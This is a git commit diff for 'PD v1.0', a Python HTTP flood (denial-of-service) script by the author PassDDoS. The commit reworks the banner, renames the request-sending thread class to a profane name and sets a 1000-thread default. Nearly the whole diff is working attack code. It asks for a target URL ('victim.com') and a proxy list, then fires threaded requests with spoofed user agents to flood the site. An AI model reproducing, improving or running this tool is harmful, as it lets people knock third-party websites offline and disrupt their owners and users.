3c6945a93d5cf0bfb9fcca12c1b53225dc34b88c
PassDDoS <41880206+PassDDoS@users.noreply.github.com>
2019-08-18 14:00:36 +0700

    Update and rename PD_v1.py to pdv1.py

--- pdv1.py
+++ pdv1.py
@@ -1,11 +1,11 @@
 #-- coding: utf8 --
 #!/usr/bin/env python3
-
-#-------------------------------#
-# Contact: andanh3705@gmail.com #
-# YouTube: bit.ly/PassDDoS      #
-#-------------------------------#
-
+#===============================#
+#           PD v1.0             #
+#      C0d3d by PassDDoS        #
+#    YouTube: biy.ly/2PDXYZ     #
+#    Discord: PassDDoS#0690     #
+#===============================#
 import urllib.request, os, threading, time, random, sys
 	
 useragents = [
@@ -20,7 +20,7 @@ useragents = [
       "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
       "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",]	
 	
-class Spammer(threading.Thread):
+class fucker(threading.Thread):
     
     def __init__(self, url, number, proxy):
         threading.Thread.__init__(self)
@@ -37,7 +37,7 @@ class Spammer(threading.Thread):
         urllib.request.install_opener(opener) 
         req = urllib.request.Request(self.url, data, self.headers)
         urllib.request.urlopen(req)
-        sys.stdout.write("[+] HTTP Flood | Packet => [%s]\n"%(self.url))
+        print("[+] HTTP Flood | Packet => [%s]\r"%(self.url))
             
     def run(self):
         global Close, Request, Tot_req
@@ -64,27 +64,25 @@ class MainLoop():
                  |  __/ (_| \__ \__ \ |_| | |_| | (_) |__) |
                  |_|   \__,_|___/___/____/|____/ \___/____/
 """)
-        while True:        
+        try:
             url = input('[*] Target [http://victim.com]: ')
-            try:
-                req = urllib.request.Request(url, None, {'User-Agent' : random.choice(useragents)})
-                response = urllib.request.urlopen(req)
-                break
-            except:
-                break
-        try:
-            lista = str(input('[*] Proxy: '))
-            in_file = open(lista,"r")
         except:
-            print ('[X] Error to read file.')
+            url = input('[*] Target [http://victim.com]: ')
         try:
-            num_threads = int(input('[*] Thread [800]: '))
+            file_proxy = str(input('[*] Proxy: '))
+            in_file = open(file_proxy,"r")
         except:
-            num_threads = num_threads 
-
+            file_proxy = str(input('[*] Proxy: '))
+            in_file = open(file_proxy,"r")
+        num_threads = str(input('[*] Thread [1000]: '))
+        if num_threads == "":
+            num_threads = int(1000)
+            print("[!] Thread = 1000")
+        else:
+            num_threads = int(num_threads)
         for i in range(num_threads):
             in_line = in_file.readline()
-            Spammer(url, i + 1, in_line).start()
+            fucker(url, i + 1, in_line).start()
             in_line = in_line[:-1]
         
 if __name__ == '__main__':
